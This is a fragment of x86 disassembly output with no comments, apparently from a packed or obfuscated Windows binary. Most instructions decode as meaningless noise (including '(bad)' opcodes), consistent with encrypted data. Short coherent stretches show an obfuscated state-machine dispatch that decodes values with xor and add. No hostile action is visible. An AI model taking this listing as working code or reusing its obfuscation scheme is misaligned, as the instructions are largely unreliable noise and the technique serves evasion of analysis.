  40ea73:	sub    bh,ch
  40ea75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea77:	mov    bl,0x9f
  40ea79:	xchg   edi,eax
  40ea7a:	cmp    esp,esp
  40ea7c:	jbe    0x40eabe
  40ea7e:	stos   DWORD PTR es:[edi],eax
  40ea7f:	mul    DWORD PTR [ebx-0x24e174e6]
  40ea85:	sbb    ch,ch
  40ea87:	aas    
  40ea88:	mov    cl,0xa5
  40ea8a:	mov    ds:0xf061c8ff,al
  40ea8f:	rol    DWORD PTR [esi+0x5bf96cea],0xe1
  40ea96:	or     eax,0x73f4cc23
  40ea9b:	fnstcw WORD PTR [ebx]
  40ea9d:	jmp    0x40eb00
  40ea9f:	ret    
  40eaa0:	aad    0x13
  40eaa2:	sti    
  40eaa3:	dec    ebx
  40eaa4:	cmp    cl,dl
  40eaa6:	ret    
  40eaa7:	inc    edi
  40eaa8:	jmp    0xfd33d46f
  40eaad:	call   0x264e60d1
  40eab2:	add    bh,0x5d
  40eab5:	fs jo  0x40eb2e
  40eab8:	aas    
  40eab9:	jno    0x40ea3f
  40eabb:	call   0x6f74f7d2
  40eac0:	jecxz  0x40eab4
  40eac2:	mov    dh,0x81
  40eac4:	cmp    eax,0xdab78e2a
  40eac9:	(bad)  
  40eaca:	scas   eax,DWORD PTR es:[edi]
  40eacb:	ins    DWORD PTR es:[edi],dx
  40eacc:	mov    al,ds:0x551bc9f9
  40ead1:	mov    ch,0xe1
  40ead3:	out    dx,al
  40ead4:	gs push esp
  40ead6:	xchg   BYTE PTR [ecx],ah
  40ead8:	into   
  40ead9:	push   ebx
  40eada:	or     dl,al
  40eadc:	rcr    BYTE PTR ds:0x2853c953,1
  40eae2:	ror    BYTE PTR [ebp-0x469089d6],1
  40eae8:	sub    eax,0x2312f1ed
  40eaed:	push   ds
  40eaee:	fstp   DWORD PTR [ebx+0x1952872]
  40eaf4:	mov    esi,0xafb712a3
  40eaf9:	pop    es
  40eafa:	fmul   DWORD PTR ds:0xf4b8f6af
  40eb00:	int    0xda
  40eb02:	dec    ebx
  40eb03:	mov    DWORD PTR [esi],ecx
  40eb05:	ds jns 0x40eab5
  40eb08:	fisubr DWORD PTR [eax+0x1f571122]
  40eb0e:	mov    ecx,0x18dd25f4
  40eb13:	add    BYTE PTR [eax],0x42
  40eb16:	repz dec ebp
  40eb18:	adc    dl,BYTE PTR [eax]
  40eb1a:	mov    WORD PTR [esi+ebp*1+0x33],fs
  40eb1e:	add    al,0x31
  40eb20:	mov    esi,0xeefa4f93
  40eb25:	mov    cl,0x4f
  40eb27:	dec    edx
  40eb28:	sbb    BYTE PTR [ecx+ebp*4],ch
  40eb2b:	pop    edi
  40eb2c:	cs dec ebp
  40eb2e:	ds iret 
  40eb30:	and    DWORD PTR [edi],ebx
  40eb32:	test   BYTE PTR [edx-0x3f28dac],al
  40eb38:	retf   
  40eb39:	mov    esp,0x865d70ab
  40eb3e:	rcr    DWORD PTR [esi+eiz*2-0x58701e20],0x60
  40eb46:	jmp    0x5dc2:0x87de50a0
  40eb4d:	push   0xfffffffa
  40eb4f:	out    0xe,eax
  40eb51:	shr    BYTE PTR [ebp+0x32f33f7d],0xb
  40eb58:	inc    eax
  40eb59:	jnp    0x40eb28
  40eb5b:	sub    eax,0xcbb5ba59
  40eb60:	(bad)  
  40eb61:	pop    ds
  40eb62:	mov    ch,0xd
  40eb64:	xchg   ebx,eax
  40eb65:	jl     0x40eb57
  40eb67:	dec    ebp
  40eb68:	sti    
  40eb69:	not    BYTE PTR [edx]
  40eb6b:	pop    ecx
  40eb6c:	mov    dh,0x74
  40eb6e:	push   0x5eeeba02
  40eb73:	out    0x19,al
  40eb75:	mov    ecx,0x95a6276f
  40eb7a:	inc    ebx
  40eb7b:	aaa    
  40eb7c:	scas   eax,DWORD PTR es:[edi]
  40eb7d:	adc    eax,0xdbec8f3b
  40eb82:	sbb    cl,al
  40eb84:	es xor ah,bl
  40eb87:	cmp    ch,BYTE PTR [edi+esi*4-0x5323e309]
  40eb8e:	mov    esi,0x4f717cb5
  40eb93:	sbb    BYTE PTR [ebx-0x29],bh
  40eb96:	(bad)  
  40eb97:	jne    0x40ebe5
  40eb99:	ret    
  40eb9a:	adc    al,0xb6
  40eb9c:	aad    0x55
  40eb9e:	xchg   ebp,eax
  40eb9f:	inc    esp
  40eba0:	lods   eax,DWORD PTR ds:[esi]
  40eba1:	jbe    0x40ebe3
  40eba3:	fdivr  DWORD PTR [esi]
  40eba5:	ret    
  40eba6:	push   0x32
  40eba8:	daa    
  40eba9:	pop    ecx
  40ebaa:	hlt    
  40ebab:	popa   
  40ebac:	xor    eax,0x61701b9e
  40ebb1:	mov    ebp,0xd9e2e334
  40ebb6:	push   edi
  40ebb7:	push   ds
  40ebb8:	popa   
  40ebb9:	adc    cl,bl
  40ebbb:	cld    
  40ebbc:	mov    esi,0x8037c21c
  40ebc1:	mov    ds:0xd41e99bb,al
  40ebc6:	les    esi,FWORD PTR [edx]
  40ebc8:	jmp    0x5f16fcbd
  40ebcd:	mov    ds:0x8a08019a,al
  40ebd2:	pushf  
  40ebd3:	fwait
  40ebd4:	mov    ch,0xd5
  40ebd6:	inc    eax
  40ebd7:	adc    al,bh
  40ebd9:	sahf   
  40ebda:	xor    DWORD PTR [eax+edx*4-0x4],0x8
  40ebdf:	push   edx
  40ebe0:	mov    ?,WORD PTR [ecx+0x28]
  40ebe3:	sbb    BYTE PTR [ecx-0x3b39f2c0],bl
  40ebe9:	rcr    al,cl
  40ebeb:	xchg   edi,eax
  40ebec:	mov    al,0x6c
  40ebee:	sar    DWORD PTR es:[edi-0x66],0x1d
  40ebf3:	push   eax
  40ebf4:	push   0x7f7d4ec2
  40ebf9:	repnz pop edx
  40ebfb:	fist   DWORD PTR [esi+0x62]
  40ebfe:	aad    0x9f
  40ec00:	and    ah,BYTE PTR [edi+0x5628d609]
  40ec06:	or     eax,0x3498bade
  40ec0b:	arpl   di,si
  40ec0d:	and    BYTE PTR [edx-0x61],dl
  40ec10:	outs   dx,BYTE PTR ds:[esi]
  40ec11:	in     al,0x47
  40ec13:	das    
  40ec14:	jo     0x40ebe0
  40ec16:	cmp    DWORD PTR [edx+0x2c],ebp
  40ec19:	ss pop ecx
  40ec1b:	jb     0x40ebd1
  40ec1d:	xchg   edi,eax
  40ec1e:	pop    esp
  40ec1f:	test   al,0x9e
  40ec21:	arpl   WORD PTR [ecx+ebp*2-0x2f00c0b3],ax
  40ec28:	bound  edi,QWORD PTR [eax-0x37]
  40ec2b:	or     ebp,ecx
  40ec2d:	nop
  40ec2e:	and    ecx,edx
  40ec30:	jno    0x40ebd4
  40ec32:	popa   
  40ec33:	inc    ebp
  40ec34:	inc    ebx
  40ec35:	popf   
  40ec36:	adc    DWORD PTR [eax+0x3512adbb],ecx
  40ec3c:	shl    DWORD PTR [eax+ebx*4+0x54],1
  40ec40:	and    BYTE PTR [esi+0x1a575a9],ah
  40ec46:	leave  
  40ec47:	dec    ebp
  40ec48:	fnstsw WORD PTR ds:0xc7008b2a
  40ec4e:	add    eax,0x4336eb
  40ec53:	xchg   esp,eax
  40ec54:	aas    
  40ec55:	add    BYTE PTR [eax],al
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4336b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43362f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433733,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43373f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [esi+edx*1-0x6b28a3],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	xlat   BYTE PTR ds:[ebx]
  40eccd:	xor    edx,DWORD PTR [esi-0x53]
  40ecd0:	push   edi
  40ecd1:	add    edi,DWORD PTR fs:[edx]
  40ecd4:	stos   DWORD PTR es:[edi],eax
  40ecd5:	into   
  40ecd6:	adc    ecx,0xffffffa5
  40ecd9:	std    
  40ecda:	inc    ebp
  40ecdb:	sub    eax,0x4c5682bf
  40ece0:	adc    esi,DWORD PTR [esi+eiz*2]
  40ece3:	aaa    
  40ece4:	add    ebp,DWORD PTR [edi+0x2c]
  40ece7:	and    bh,ch
  40ece9:	xor    BYTE PTR [ebx],dh
  40eceb:	rcl    DWORD PTR [edi],0x27
  40ecee:	mov    al,ds:0x9b97d13b
  40ecf3:	inc    ebp
  40ecf4:	dec    ecx
  40ecf5:	shr    DWORD PTR [edx+0x56a6efaa],1
  40ecfb:	aam    0xcb
  40ecfd:	frstor [ecx+0x26925b56]
  40ed03:	loop   0x40ece3
  40ed05:	ins    DWORD PTR es:[edi],dx
  40ed06:	(bad)  
  40ed07:	and    al,0xdf
  40ed09:	add    al,0xf8
  40ed0b:	or     DWORD PTR [edx],ebp
  40ed0d:	fstp   TBYTE PTR [ebx-0x32]
  40ed10:	dec    esp
  40ed11:	inc    ebx
  40ed12:	jno    0x40ed4f
  40ed14:	mov    ds:0x4aecddfb,al
  40ed19:	sbb    cl,bh
  40ed1b:	pop    ecx
  40ed1c:	inc    esp
  40ed1d:	jle    0x40ecbc
  40ed1f:	cmp    al,0xbe
  40ed21:	jp     0x40ed12
  40ed23:	dec    ebp
  40ed24:	nop
  40ed25:	jmp    0x93e4e7d2
  40ed2a:	and    eax,0x853c5f01
  40ed2f:	mov    ebx,0x5c3d386d
  40ed34:	scas   eax,DWORD PTR es:[edi]
  40ed35:	clc    
  40ed36:	in     eax,0x94
  40ed38:	push   0xfffffffe
  40ed3a:	jne    0x40ed05
  40ed3c:	or     BYTE PTR [ecx],bh
  40ed3e:	les    eax,FWORD PTR [eax+0x20]
  40ed41:	and    BYTE PTR [edi],al
  40ed43:	adc    ah,BYTE PTR [edx+0x580e87be]
  40ed49:	mov    ebp,0xc711443f
  40ed4e:	push   es
  40ed4f:	push   cs
  40ed50:	sub    DWORD PTR [ebx-0x4d60fa19],eax
  40ed56:	sti    
  40ed57:	(bad)  [edi]
  40ed59:	repz push ecx
  40ed5b:	mov    edx,0x3b9eb747
  40ed60:	adc    BYTE PTR [eax],dh
  40ed62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed63:	test   esi,eax
  40ed65:	(bad)  
  40ed66:	int3   
  40ed67:	dec    esp
  40ed68:	pop    es
  40ed69:	retf   0x3be7
  40ed6c:	daa    
  40ed6d:	sbb    ecx,ebp
  40ed6f:	fs aas 
  40ed71:	sbb    DWORD PTR [esi-0x20],0x6712944d
  40ed78:	arpl   WORD PTR [ecx],ax
  40ed7a:	sub    eax,0x7618aa5e
  40ed7f:	inc    edi
  40ed80:	test   eax,0x1f13fcc9
  40ed85:	mov    ch,0xa0
  40ed87:	jnp    0x40ed11
  40ed89:	fisub  DWORD PTR [esi-0x5478515]
  40ed8f:	push   eax
  40ed90:	lahf   
  40ed91:	push   ebx
  40ed92:	cmp    al,0x37
  40ed94:	push   esp
  40ed95:	jmp    ecx
  40ed97:	jo     0x40ed99
  40ed99:	push   cs
  40ed9a:	repnz mov ch,0x89
  40ed9d:	test   DWORD PTR [ebx+eax*4+0x7743a531],0xd3b3a2eb
  40eda8:	out    0x22,al
  40edaa:	stc    
  40edab:	pop    eax
  40edac:	xor    ebx,DWORD PTR [eax]
  40edae:	loop   0x40ee0d
  40edb0:	sbb    BYTE PTR [esi],al
  40edb2:	jge    0x40ee1a
  40edb4:	mov    eax,es
  40edb6:	sbb    bh,BYTE PTR fs:[ebx+0xb954cd9]
  40edbd:	popf   
  40edbe:	outs   dx,DWORD PTR ds:[esi]
  40edbf:	xor    BYTE PTR [eax+0x3b9e79c4],ch
  40edc5:	rcl    DWORD PTR [edi+0x56],1
  40edc8:	fidiv  WORD PTR [ebx+0x4c]
  40edcb:	sub    DWORD PTR [edx-0x7d7e078e],0x52
  40edd2:	int    0x40
  40edd4:	mov    eax,0xfb31d633
  40edd9:	shr    BYTE PTR [ebp+0x2ec2c7d8],cl
  40eddf:	lahf   
  40ede0:	mov    WORD PTR ds:0x9642e055,?
  40ede6:	push   ds
  40ede7:	icebp  
  40ede8:	ret    0x1fbf
  40edeb:	inc    esp
  40edec:	mov    WORD PTR [ebx+0x18afcdc5],ds
  40edf2:	mov    dh,0xd
  40edf4:	xchg   ebp,eax
  40edf5:	sub    BYTE PTR [esi+ebx*4-0x66],0xac
  40edfa:	jns    0x40edfd
  40edfc:	in     al,0xbb
  40edfe:	xchg   esi,eax
  40edff:	jg     0x40edf0
  40ee01:	cs inc eax
  40ee03:	sbb    edx,DWORD PTR [ecx-0x5c]
  40ee06:	test   ecx,edi
  40ee08:	das    
  40ee09:	mov    ebp,0xfa0ea0ef
  40ee0e:	gs int3 
  40ee10:	dec    ecx
  40ee11:	add    DWORD PTR [ebp-0x693a9d97],esp
  40ee17:	lods   al,BYTE PTR ds:[esi]
  40ee18:	mov    dh,0x2e
  40ee1a:	inc    esi
  40ee1b:	icebp  
  40ee1c:	mov    dh,0x8
  40ee1e:	rcl    BYTE PTR [esi],cl
  40ee20:	mov    ah,0x9a
  40ee22:	sbb    dh,BYTE PTR ds:0x80e6a4c3
  40ee28:	jp     0x40edbe
  40ee2a:	sbb    esp,DWORD PTR [esi]
  40ee2c:	test   DWORD PTR [ebx+0x7a481ca1],edi
  40ee32:	dec    ebx
  40ee33:	mov    eax,ds:0xa0d17ded
  40ee38:	dec    ebx
  40ee39:	icebp  
  40ee3a:	popf   
  40ee3b:	imul   ebp,DWORD PTR [ecx+0x25e22a30],0xea7a47b5
  40ee45:	pop    ebx
  40ee46:	dec    edi
  40ee47:	(bad)  
  40ee48:	jnp    0x40ee87
  40ee4a:	call   DWORD PTR [edi-0x5661fe59]
  40ee50:	xlat   BYTE PTR ds:[ebx]
  40ee51:	mov    bl,0x41
  40ee53:	push   ds
  40ee54:	xor    al,0x98
  40ee56:	test   eax,0x284198ad
  40ee5b:	and    al,0xba
  40ee5d:	scas   eax,DWORD PTR es:[edi]
  40ee5e:	mov    ?,WORD PTR [esi-0x5865754d]
  40ee64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee65:	mov    dl,0xf3
  40ee67:	inc    edi
  40ee68:	or     DWORD PTR [edx+0x5f],esp
  40ee6b:	sub    BYTE PTR ds:0x258df1b6,ah
  40ee71:	cmp    eax,DWORD PTR ds:0xe3ce7d26
  40ee77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee78:	call   0x58097fbb
  40ee7d:	enter  0x6de2,0xd1
  40ee81:	push   eax
  40ee82:	jo     0x40eeba
  40ee84:	stos   DWORD PTR es:[edi],eax
  40ee85:	retf   0x9cd7
  40ee88:	(bad)  
  40ee89:	leave  
  40ee8a:	(bad)  
  40ee8b:	pop    ebx
  40ee8c:	push   ebx
  40ee8d:	punpckhwd mm3,QWORD PTR [esp+edx*4+0x6d]
  40ee92:	push   ebx
  40ee93:	or     DWORD PTR [ebp-0x231f6fa4],eax
  40ee99:	out    dx,eax
  40ee9a:	or     dh,al
  40ee9c:	std    
  40ee9d:	fmul   QWORD PTR [eax+ebp*8+0x2302d7cd]
  40eea4:	mov    edi,0xda3106c0
  40eea9:	nop
  40eeaa:	xor    al,0x92
  40eeac:	mov    es,WORD PTR ds:0xb007e181
  40eeb2:	int3   
  40eeb3:	rol    BYTE PTR [ebx+0x7124d536],cl
  40eeb9:	pop    edi
  40eeba:	hlt    
  40eebb:	push   edx
  40eebc:	ret    
  40eebd:	pop    ecx
  40eebe:	cdq    
  40eebf:	mov    eax,ecx
  40eec1:	sti    
  40eec2:	call   0x4e6fa79e
  40eec7:	scas   al,BYTE PTR es:[edi]
  40eec8:	cld    
  40eec9:	shr    BYTE PTR [esi-0xcabb4a6],0xf0
  40eed0:	xchg   edx,eax
  40eed1:	xor    ecx,DWORD PTR [ebx]
  40eed3:	add    eax,0xffffffcf
  40eed6:	mov    edx,DWORD PTR [ecx+0x2b468659]
  40eedc:	call   0x404a7e
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x7098ef46],0x8f25cec2
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef84
  40ef11:	(bad)  
  40ef12:	(bad)  
  40ef13:	sar    ecx,1
  40ef15:	fadd   QWORD PTR [edi-0x72]
  40ef18:	and    bl,BYTE PTR [esi-0x31]
  40ef1b:	pushf  
  40ef1c:	cmp    edx,eax
  40ef1e:	aad    0x30
  40ef20:	push   edx
  40ef21:	jnp    0x40eeca
  40ef23:	scas   eax,DWORD PTR es:[edi]
  40ef24:	inc    esi
  40ef25:	cmp    ebp,DWORD PTR [ebx+0x4f]
  40ef28:	sub    DWORD PTR [edi],esi
  40ef2a:	mov    cl,0x9e
  40ef2c:	add    cl,BYTE PTR ds:[edx-0x41]
  40ef30:	fild   WORD PTR [ebx]
  40ef32:	add    BYTE PTR [ebp+0x5f8ae4b9],ah
  40ef38:	dec    edi
  40ef39:	rcl    DWORD PTR [eax+0x7],1
  40ef3c:	mov    dl,0x1f
  40ef3e:	inc    edi
  40ef3f:	loope  0x40ef64
  40ef41:	dec    ebp
  40ef42:	stos   DWORD PTR es:[edi],eax
  40ef43:	imul   ebx
  40ef45:	dec    esi
  40ef46:	retf   
  40ef47:	loopne 0x40efbd
  40ef49:	sbb    esi,DWORD PTR [ecx]
  40ef4b:	pop    esi
  40ef4c:	xchg   edi,eax
  40ef4d:	cmc    
  40ef4e:	(bad)  
  40ef4f:	mov    bh,0xff
  40ef51:	jle    0x40ef90
  40ef53:	int    0xc0
  40ef55:	sub    ebp,DWORD PTR [esi+0xa]
  40ef58:	bound  eax,QWORD PTR [eax-0x2]
  40ef5b:	(bad)  
  40ef5c:	pop    esi
  40ef5d:	sbb    eax,0x6bc53397
  40ef62:	lahf   
  40ef63:	mov    al,0x1a
  40ef65:	ss aad 0x2d
  40ef68:	jne    0x40efc6
  40ef6a:	out    dx,al
  40ef6b:	ins    BYTE PTR es:[edi],dx
  40ef6c:	fnsave [edx+0x4b]
  40ef6f:	inc    ebp
  40ef70:	xchg   esi,eax
  40ef71:	or     eax,0x3bf9da38
  40ef76:	adc    ebp,ebx
  40ef78:	lods   eax,DWORD PTR ds:[esi]
  40ef79:	inc    ecx
  40ef7a:	mov    al,ds:0x83ce9287
  40ef7f:	cld    
  40ef80:	push   edi
  40ef81:	xchg   esp,eax
  40ef82:	sahf   
  40ef83:	and    cl,dl
  40ef85:	fsubr  DWORD PTR [eax+0x1d4c36f1]
  40ef8b:	fdivp  st(1),st
  40ef8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef8e:	adc    DWORD PTR [edx-0x50],eax
  40ef91:	loop   0x40ef32
  40ef93:	sar    BYTE PTR [eax],1
  40ef95:	mov    dh,0xb
  40ef97:	xor    esp,DWORD PTR [ebp+0x5ea06784]
  40ef9d:	shl    DWORD PTR [edx+ebx*4-0x6d],0xc4
  40efa2:	jge    0x40efd7
  40efa4:	rol    DWORD PTR [esi+0x19],1
  40efa7:	jecxz  0x40ef5f
  40efa9:	daa    
  40efaa:	fist   WORD PTR [esi+0x7]
  40efad:	adc    BYTE PTR [esi+0x62],bh
  40efb0:	push   ebx
  40efb1:	mov    edx,0xd0d7f71c
  40efb6:	enter  0xdfa6,0x6e
  40efba:	xchg   DWORD PTR [ebp+0x47],eax
  40efbd:	int3   
  40efbe:	out    dx,eax
  40efbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efc0:	pop    edx
  40efc1:	cld    
  40efc2:	ror    DWORD PTR [ebp-0x7ad77fea],1
  40efc8:	xor    esi,DWORD PTR [eax]
  40efca:	mov    ds:0x6e58e437,eax
  40efcf:	sbb    DWORD PTR [ebp+0x13],edx
  40efd2:	push   esp
  40efd3:	imul   BYTE PTR [edx+0x63]
  40efd6:	ss in  al,0x84
  40efd9:	mov    al,0xb2
  40efdb:	stos   BYTE PTR es:[edi],al
  40efdc:	mov    esp,0x7f160ed9
  40efe1:	mov    BYTE PTR [eax+ebp*8],cl
  40efe4:	jnp    0x40efc0
  40efe6:	scas   al,BYTE PTR es:[edi]
  40efe7:	mov    ds:0xd2bc511,eax
  40efec:	sti    
  40efed:	push   eax
  40efee:	push   ebp
  40efef:	adc    ecx,DWORD PTR [ebx-0x6]
  40eff2:	ins    BYTE PTR es:[edi],dx
  40eff3:	(bad)  
  40eff4:	aas    
  40eff5:	push   edx
  40eff6:	inc    edi
  40eff7:	inc    ebx
  40eff8:	jge    0x40ef7a
  40effa:	inc    ebp
  40effb:	pop    ebp
  40effc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40effd:	mov    dl,0x7
  40efff:	fdivp  st(5),st
  40f001:	ja     0x40f01a
  40f003:	jnp    0x40f020
  40f005:	fisttp QWORD PTR [esi-0x12]
  40f008:	ds xchg dh,dl
  40f00b:	push   esp
  40f00c:	out    0x94,al
  40f00e:	mov    esi,0xc62a24f6
  40f013:	and    esi,eax
  40f015:	and    BYTE PTR [edi-0x45],ah
  40f018:	add    esp,ecx
  40f01a:	popa   
  40f01b:	xchg   edi,eax
  40f01c:	jne    0x40efc4
  40f01e:	icebp  
  40f01f:	in     al,dx
  40f020:	xchg   edx,eax
  40f021:	rcr    BYTE PTR [ebx+0x78],0x16
  40f025:	jmp    0x40f01b
  40f027:	sbb    eax,0xa6275d2f
  40f02c:	call   0x4ac44cb3
  40f031:	rcl    bl,cl
  40f033:	sbb    al,0xc2
  40f035:	push   edx
  40f036:	add    ecx,DWORD PTR [ecx+ebx*4]
  40f039:	jo     0x40f09b
  40f03b:	ins    BYTE PTR es:[edi],dx
  40f03c:	fldcw  WORD PTR [eax-0x5f]
  40f03f:	ds out 0x49,eax
  40f042:	mov    ?,WORD PTR [ebx-0x250ebb5a]
  40f048:	fbstp  TBYTE PTR [esi-0xe]
  40f04b:	test   BYTE PTR [ebx],0xfa
  40f04e:	sets   BYTE PTR [esi-0x2c9fe429]
  40f055:	repnz in al,0x15
  40f058:	out    0x82,eax
  40f05a:	push   esi
  40f05b:	(bad)  
  40f05c:	xchg   ebp,eax
  40f05d:	lods   eax,DWORD PTR ds:[esi]
  40f05e:	stos   DWORD PTR es:[edi],eax
  40f05f:	sub    al,0xac
  40f061:	cmp    ch,BYTE PTR [edi-0x7e]
  40f064:	std    
  40f065:	and    ebx,DWORD PTR [ebx-0x4277f715]
  40f06b:	sub    eax,0xa99b09b4
  40f070:	std    
  40f071:	and    DWORD PTR [ebp+0x45414c60],0x10c36c15
  40f07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f07c:	pushf  
  40f07d:	add    DWORD PTR [eax+0x6],ebp
  40f080:	push   es
  40f081:	mov    bh,0xad
  40f083:	sbb    al,0xf
  40f085:	xor    BYTE PTR [edi+0x203b8158],bh
  40f08b:	sbb    bh,dl
  40f08d:	push   edi
  40f08e:	mov    esi,0x60c8798e
  40f093:	jb     0x40f06a
  40f095:	fs enter 0xb951,0xc6
  40f09a:	push   edi
  40f09b:	xor    BYTE PTR [ecx],bh
  40f09d:	xchg   esp,eax
  40f09e:	dec    ebp
  40f09f:	pop    esp
  40f0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0a1:	loop   0x40f0bb
  40f0a3:	shl    BYTE PTR [ecx],cl
  40f0a5:	xchg   ebp,eax
  40f0a6:	popa   
  40f0a7:	jns    0x40f08b
  40f0a9:	fiadd  WORD PTR [eax+0x2b]
  40f0ac:	pushf  
  40f0ad:	jbe    0x40f100
  40f0af:	jge    0x40f11e
  40f0b1:	in     eax,0xe7
  40f0b3:	jae    0x40f105
  40f0b5:	mov    bh,0xbe
  40f0b7:	dec    ebp
  40f0b8:	mov    cl,0x39
  40f0ba:	xchg   ebx,eax
  40f0bb:	in     eax,0xc0
  40f0bd:	or     DWORD PTR [esi],esp
  40f0bf:	jmp    0xbc05:0x45197754
  40f0c6:	lods   al,BYTE PTR ds:[esi]
  40f0c7:	mov    ch,bh
  40f0c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0ca:	rcl    BYTE PTR [esi+0x6dfe157b],1
  40f0d0:	or     al,0x67
  40f0d2:	in     eax,0x95
  40f0d4:	or     al,0x19
  40f0d6:	push   ss
  40f0d7:	fadd   QWORD PTR [ecx]
  40f0d9:	arpl   WORD PTR [eax+ebx*2-0x52],dx
  40f0dd:	pop    edx
  40f0de:	pop    edi
  40f0df:	test   DWORD PTR [ebp-0x37ab2369],edi
  40f0e5:	mov    edx,DWORD PTR [ecx+0x9849b67]
  40f0eb:	cmp    al,0x12
  40f0ed:	adc    al,0xfa
  40f0ef:	call   0xef923fe2
  40f0f4:	xchg   edi,eax
  40f0f5:	push   0x2
  40f0f7:	test   eax,0x119df374
  40f0fc:	xchg   ebp,eax
  40f0fd:	(bad)  
  40f0ff:	fwait
  40f100:	pop    ebp
  40f101:	or     eax,DWORD PTR [ecx]
  40f103:	adc    ebx,DWORD PTR [eax+0x7e]
  40f106:	jo     0x40f172
  40f108:	dec    esp
  40f109:	stc    
  40f10a:	lahf   
  40f10b:	fwait
  40f10c:	int    0xa7
  40f10e:	fucomi st,st(3)
  40f110:	and    ebp,DWORD PTR [eax+0x4e]
  40f113:	fadd   QWORD PTR [ecx-0x31969def]
  40f119:	ror    DWORD PTR [ecx],1
  40f11b:	shr    BYTE PTR [ebx-0x13],1
  40f11e:	pop    ecx
  40f11f:	std    
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx+0x5aeab065]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f17d
  40f1e9:	adc    bl,0xd6
  40f1ec:	mov    WORD PTR [edx+eax*2],?
  40f1ef:	sbb    eax,0xc6ecc572
  40f1f4:	mov    esp,0x5fd7e2c2
  40f1f9:	stos   DWORD PTR es:[edi],eax
  40f1fa:	and    edi,DWORD PTR ds:0x2934ab13
